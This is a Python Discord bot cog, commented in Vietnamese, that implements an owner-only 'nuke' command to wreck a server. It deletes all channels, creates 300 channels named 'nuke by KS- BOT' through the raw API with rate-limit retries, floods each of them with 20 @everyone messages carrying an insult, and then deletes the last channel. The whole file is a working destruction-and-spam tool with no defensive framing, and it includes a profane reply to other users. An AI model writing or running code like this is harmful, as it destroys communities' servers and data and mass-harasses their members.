import discord
from discord.ext import commands
import asyncio
import aiohttp

# ID chủ sở hữu bot chuẩn của bạn
CHINH_CHU_ID = 1404399385965498479

class NukeCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # Hỗ trợ cả 2 dạng prefix: .nuke và !nuke
    @commands.command(name="nuke", aliases=[])
    async def nuke(self, ctx):
        # Kiểm tra quyền Owner tuyệt đối
        if ctx.author.id != CHINH_CHU_ID:
            await ctx.send("t ko hiểu, nuke con mẹ mài -))")
            return

        guild = ctx.guild
        current_channel_id = ctx.channel.id
        token = self.bot.http.token

        headers = {
            "Authorization": f"Bot {token}",
            "Content-Type": "application/json"
        }

        await ctx.send("⚡ Đang tiến hành xóa kênh và tạo 300 kênh 'nuke by KS- BOT'...")

        # 1. Xóa toàn bộ kênh cũ song song (trừ kênh đang gõ lệnh)
        delete_tasks = [channel.delete() for channel in guild.channels if channel.id != current_channel_id]
        await asyncio.gather(*delete_tasks, return_exceptions=True)

        # Tiến trình chạy ngầm để tối ưu hiệu suất
        async def background_nuke():
            semaphore = asyncio.Semaphore(12)
            channel_ids = []

            # BƯỚC 1: Tạo trước trọn vẹn 300 kênh không số
            async def create_channel_only(session, index):
                async with semaphore:
                    payload_channel = {"name": "nuke by KS- BOT", "type": 0}
                    while True:
                        try:
                            async with session.post(f"https://discord.com/api/v10/guilds/{guild.id}/channels", json=payload_channel, headers=headers) as resp:
                                if resp.status == 429:
                                    data = await resp.json()
                                    await asyncio.sleep(data.get("retry_after", 1.0))
                                    continue
                                if resp.status == 201:
                                    data = await resp.json()
                                    channel_ids.append(data["id"])
                                break
                        except Exception:
                            await asyncio.sleep(0.5)
                            break

            async with aiohttp.ClientSession() as session:
                create_tasks = [create_channel_only(session, i) for i in range(1, 301)]
                await asyncio.gather(*create_tasks, return_exceptions=True)

                # BƯỚC 2: Sau khi tạo đủ 300 kênh, tiến hành spam đồng loạt với chữ bự hết cỡ (#)
                # Nội dung gồm: ||@everyone|| nuke by KS- BOT \n tuổi con gà
                spam_content = "# ||@everyone|| nuke by KS- BOT\n# tuổi con gà"
                
                async def spam_channel(channel_id):
                    payload_msg = {"content": spam_content}
                    for _ in range(20): # Mặc định 20 tin nhắn mỗi kênh
                        while True:
                            try:
                                async with session.post(f"https://discord.com/api/v10/channels/{channel_id}/messages", json=payload_msg, headers=headers) as msg_resp:
                                    if msg_resp.status == 429:
                                        msg_data = await msg_resp.json()
                                        await asyncio.sleep(msg_data.get("retry_after", 0.5))
                                        continue
                                    break
                            except Exception:
                                break

                spam_tasks = [spam_channel(ch_id) for ch_id in channel_ids]
                await asyncio.gather(*spam_tasks, return_exceptions=True)

            # Xóa nốt kênh lệnh ban đầu
            current_channel = guild.get_channel(current_channel_id)
            if current_channel:
                await current_channel.delete()

        asyncio.create_task(background_nuke())

async def setup(bot):
    await bot.add_cog(NukeCog(bot))
